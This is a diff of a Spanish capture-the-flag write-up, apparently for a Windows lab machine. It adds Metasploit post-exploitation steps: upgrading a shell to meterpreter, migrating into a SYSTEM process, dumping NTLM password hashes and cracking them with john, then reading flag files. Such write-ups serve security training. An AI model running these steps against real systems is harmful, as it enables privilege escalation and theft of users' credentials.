@@ -65,14 +65,11 @@ PORT      STATE SERVICE      VERSION
   meterpreter > 
 ```
 ## Privilege Escalation
-**Background Shell**
-```bash
-  meterpreter > (CTRL+Z) 
-Background session 1? [y/N] y
-```
 
 **Shell to Meterpreter**
 ```bash
+ meterpreter > (CTRL+Z) 
+Background session 1? [y/N] y
 msf > search shell_to_meterpreter
 #  Name                                    Disclosure Date  Rank    Check  Description
    -  ----                                    ---------------  ----    -----  -----------
@@ -92,11 +89,62 @@ Active sessions
 ```bash
  msf > Use 0
  msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
+ msf post(multi/manage/shell_to_meterpreter) > run
+ msf post(multi/manage/shell_to_meterpreter) > sessions 2
 ```
-**Switch Privilege Sesssion**
+
+**Migrate Shell**
 ```bash
-msf post(multi/manage/shell_to_meterpreter) > sessions 2
+meterpreter > ps
+Process List
+============
+
+ PID   PPID  Name            Arch  Session  User                      Path
+ ---   ----  ----            ----  -------  ----                      ----
+ 716   616   services.exe    x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\serv
+                                                                      ices.exe
+meterpreter > migrate 716
+[*] Migrating from 704 to 716...
+[*] Migration completed successfully.
+```
+**Comment:** Migramos la shell a un proceso mas estable.
+
+## Hash
+**Getting Hash**
+```bash
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+**Cracking**
+```bash
+	john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT userhash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+REDACTED         (?)     
+1g 0:00:00:01 DONE (2025-10-10 15:29) 0.9174g/s 9358Kp/s 9358Kc/s 9358KC/s alr19882006..alpusidi
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed
 ```
 
+## Flags
+**Flag 1**
+```bash
+meterpreter > cd /
+meterpreter > cat flag1.txt
+```
 
+**Flag 2**
+```bash
+meterpreter > cd /Windows/system32/config
+meterpreter > cat flag2.txt
+```
 
+**Flag 3**
+```bash
+meterpreter > cd /Users/Jon/Documents
+meterpreter > cat flag3.txt
+```
